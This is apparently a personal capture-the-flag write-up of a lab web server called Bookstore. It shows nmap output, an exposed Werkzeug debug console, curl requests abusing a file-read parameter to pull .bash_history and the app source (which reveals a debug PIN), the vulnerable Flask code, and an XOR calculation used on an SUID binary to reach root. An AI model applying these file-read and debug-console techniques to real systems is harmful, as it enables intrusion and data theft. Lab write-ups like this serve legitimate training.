```
22/tcp   open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 44:0e:60:ab:1e:86:5b:44:28:51:db:3f:9b:12:21:77 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCs5RybjdxaxapwkXwbzqZqONeX4X8rYtfTsy7wey7ZeRNsl36qQWhTrurBWWnYPO7wn2nEQ7Iz0+tmvSI3hms3eIEufCC/2FEftezKhtP1s4/qjp8UmRdaewMW2zYg+UDmn9QYmRfbBH80CLQvBwlsibEi3aLvhi/YrNCzL5yxMFQNWHIEMIry/FK1aSbMj7DEXTRnk5R3CYg3/OX1k3ssy7GlXAcvt5QyfmQQKfwpOG7UM9M8mXDCMiTGlvgx6dJkbG0XI81ho2yMlcDEZ/AsXaDPAKbH+RW5FsC5R1ft9PhRnaIkUoPwCLKl8Tp6YFSPcANVFYwTxtdUReU3QaF9
|   256 59:2f:70:76:9f:65:ab:dc:0c:7d:c1:a2:a3:4d:e6:40 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCbhAKUo1OeBOX5j9stuJkgBBmhTJ+zWZIRZyNDaSCxG6U817W85c9TV1oWw/A0TosCyr73Mn73BiyGAxis6lNQ=
|   256 10:9f:0b:dd:d6:4d:c7:7a:3d:ff:52:42:1d:29:6e:ba (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAr3xDLg8D5BpJSRh8OgBRPhvxNSPERedYUTJkjDs/jc
80/tcp   open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 834559878C5590337027E6EB7D966AEE
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Book Store
5000/tcp open  http    syn-ack Werkzeug httpd 0.14.1 (Python 3.6.9)
| http-methods:
|_  Supported Methods: HEAD GET OPTIONS
| http-robots.txt: 1 disallowed entry
|_/api </p>
|_http-server-header: Werkzeug/0.14.1 Python/3.6.9
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Got these  http://10.201.30.43:5000/api on robots.txt
```
# API Documentation

### Since every good API has a documentation we have one as well!

## The various routes this API currently provides are:

/api/v2/resources/books/all (Retrieve all books and get the output in a json format)

/api/v2/resources/books/random4 (Retrieve 4 random records)

/api/v2/resources/books?id=1(Search by a specific parameter , id parameter)

/api/v2/resources/books?author=J.K. Rowling (Search by a specific parameter, this query will return all the books with author=J.K. Rowling)

/api/v2/resources/books?published=1993 (This query will return all the books published in the year 1993)

/api/v2/resources/books?author=J.K. Rowling&published=2003 (Search by a combination of 2 or more parameters)
```

Also got this, but seems to be locked behind a pin http://10.201.30.43:5000/console
This might be my way in, the src code had these
```
|var TRACEBACK = -1,|
|CONSOLE_MODE = true,|
|EVALEX = true,|
|EVALEX_TRUSTED = false,|
|SECRET = "ZX2IQ924QlOKTYSJEHpN";| <== doesnt mean anything? 
```
Fuzzing the v2, trying v1 too

Maybe these will work? But at the same time I don't think so as it says API Fuzzing needed
```
   0  exploit/multi/http/werkzeug_debug_rce                     2015-06-28       good    Yes    Pallete Projects Werkzeug Debugger Remote Code Execution
   1    \_ target: Werkzeug > 1.0.1 (Flask > 1.1.4)             .                .       .      .
   2    \_ target: Werkzeug 0.11.6 - 1.0.1 (Flask 1.0 - 1.1.4)  .                .       .      .
   3    \_ target: Werkzeug 0.11 - 0.11.5 (Flask < 1.0)         .                .       .      .
   4    \_ target: Werkzeug < 0.11 (Flask < 1.0)                .                .       .      .
   5  auxiliary/analyze/crack_webapps                           .                normal  No     Password Cracker: Webapps
   6    \_ action: auto                                         .                .       .      Auto-selection of cracker
   7    \_ action: hashcat                                      .                .       .      Use Hashcat
   8    \_ action: john                                         .                .       .      Use John the Ripper
```

Maybe I need to fuzz the parameters, maybe parameters are changed
Tried some LFI on v2 and also on v1, parameter fuzz handai 
Lol box nai lag  bhayo, restarting

Yeah balla aayo euta and there is LFI, turns out I am in the home dir?
and there was bash history 
```
namura@pop-os ~/tryhackme $ curl http://10.201.122.179:5000/api/v1/resources/books?show=.bash_history
cd /home/sid
whoami
export WERKZEUG_DEBUG_PIN=123-321-135 <== pin
echo $WERKZEUG_DEBUG_PIN
python3 /home/sid/api.py
ls
exit
```
 and also got this, turns out it was Foxy REST API v2.0
 
 ```
 namura@pop-os ~/tryhackme $ curl http://10.201.122.179:5000/api/v1/resources/books?show=api.py
import flask
from flask import request, jsonify
from flask_cors import CORS, cross_origin
import sqlite3
import os
import subprocess


app = flask.Flask(__name__)
cors = CORS(app)
app.config["DEBUG"] = True
app.config['CORS_HEADERS'] = 'Content-Type'


def dict_factory(cursor, row):
    d = {}
    for idx, col in enumerate(cursor.description):
        d[col[0]] = row[idx]
    return d


@app.route('/', methods=['GET'])
def home():
    return '''
    <title>Home</title>
    <h1>Foxy REST API v2.0</h1>
    <p>This is a REST API for science fiction novels.</p>
 '''

@app.route('/api', methods=['GET'])
def documentation():
    return '''
        <title>API Documentation</title>
        <h1>API Documentation</h1>
        <h3>Since every good API has a documentation we have one as well!</h3>
        <h2>The various routes this API currently provides are:</h2><br>
        <p>/api/v2/resources/books/all (Retrieve all books and get the output in a json format)</p>
        <p>/api/v2/resources/books/random4 (Retrieve 4 random records)</p>
        <p>/api/v2/resources/books?id=1(Search by a specific parameter , id parameter)</p>
        <p>/api/v2/resources/books?author=J.K. Rowling (Search by a specific parameter, this query will return all the books with author=J.K. Rowling)</p>
        <p>/api/v2/resources/books?published=1993 (This query will return all the books published in the year 1993)</p>
        <p>/api/v2/resources/books?author=J.K. Rowling&published=2003 (Search by a combination of 2 or more parameters)</p>
 '''

@app.route('/api/', methods=['GET'])
def same():
    return documentation()

@app.route('/robots.txt', methods=['GET'])
def robots():
    return '''<p>User-agent: *<br><br>
Disallow: /api </p> '''


@app.route('/api/v1/resources/books/all', methods=['GET'])
def api_all():
    conn = sqlite3.connect('books.db')
    conn.row_factory = dict_factory
    cur = conn.cursor()
    all_books = cur.execute('SELECT * FROM books;').fetchall()

    return jsonify(all_books)

@app.route('/api/v2/resources/books/all', methods=['GET'])
def api_allv2():
    conn = sqlite3.connect('books.db')
    conn.row_factory = dict_factory
    cur = conn.cursor()
    all_books = cur.execute('SELECT * FROM books;').fetchall()

    return jsonify(all_books)

@app.route('/api/v2/resources/books/random4', methods=['GET'])
def api_random10():
    conn = sqlite3.connect('books.db')
    conn.row_factory = dict_factory
    cur = conn.cursor()
    all_books = cur.execute('SELECT * FROM books order by random() LIMIT 4;').fetchall()

    return jsonify(all_books)



@app.errorhandler(404)
def page_not_found(e):
    return '''<h1>404</h1>
    <p>The resource requested could not be found.</p>''', 404

@app.route('/api/v2/resources/books', methods=['GET'])
def api_filterv2():
    query_parameters = request.args

    id = query_parameters.get('id')
    published = query_parameters.get('published')
    author = query_parameters.get('author')


    query = "SELECT * FROM books WHERE"
    to_filter = []

    if id:
        query += ' id=? AND'
        to_filter.append(id)
    if published:
        query += ' published=? AND'
        to_filter.append(published)
    if author:
        query += ' author=? AND'
        to_filter.append(author)

    if not (id or published or author):
        return page_not_found(404)

    query = query[:-4] + ';'

    conn = sqlite3.connect('books.db')
    conn.row_factory = dict_factory
    cur = conn.cursor()

    results = cur.execute(query, to_filter).fetchall()

    return jsonify(results)


@app.route('/api/v1/resources/books', methods=['GET'])
def api_filter():
    query_parameters = request.args

    id = query_parameters.get('id')
    published = query_parameters.get('published')
    author = query_parameters.get('author')
    show  = query_parameters.get('show')

    query = "SELECT * FROM books WHERE"
    to_filter = []

    if id:
        query += ' id=? AND'
        to_filter.append(id)
    if published:
        query += ' published=? AND'
        to_filter.append(published)
    if author:
        query += ' author=? AND'
        to_filter.append(author)
    if show:
        try:
                with open(show, 'r') as f:
                        return f.read()
        except:
                return filename

    if not (id or published or author):
        return page_not_found(404)

    query = query[:-4] + ';'

    conn = sqlite3.connect('books.db')
    conn.row_factory = dict_factory
    cur = conn.cursor()

    results = cur.execute(query, to_filter).fetchall()

    return jsonify(results)

print(getattr(app, '__name__', getattr(app.__class__, '__name__')))

app.run(host='0.0.0.0', port=5000, debug = True)
 ```
Got user.txt and also this on SUID bit file
`   394562     12 -rwsrwsr-x   1 root     sid          8488 Oct 20  2020 /home/sid/try-harder`

Maybe just some reverse engineering?
```
sid@bookstore:~$ file try-harder
try-harder: setuid, setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=4a284afaae26d9772bb38113f55cd53608b4a29e, not stripped
```

> Binary reversing. Use XOR inversion.
> 
> Core note — short and clear
> 
> * Goal: program checks `((input ^ K1) ^ K2) == TARGET`.
> * Core property: `a ^ b ^ b = a`. XOR is its own inverse.
> * Solve: `input = TARGET ^ K2 ^ K1` (order of K1,K2 does not matter).
> * Quick compute (replace constants if yours differ):
> 
> ```bash
> python3 - <<'PY'
> TARGET = 0x5dcd21f4
> K1 = 0x1116
> K2 = 0x5db3
> print(int(TARGET ^ K2 ^ K1))
> PY
> ```

Got root and lab solved~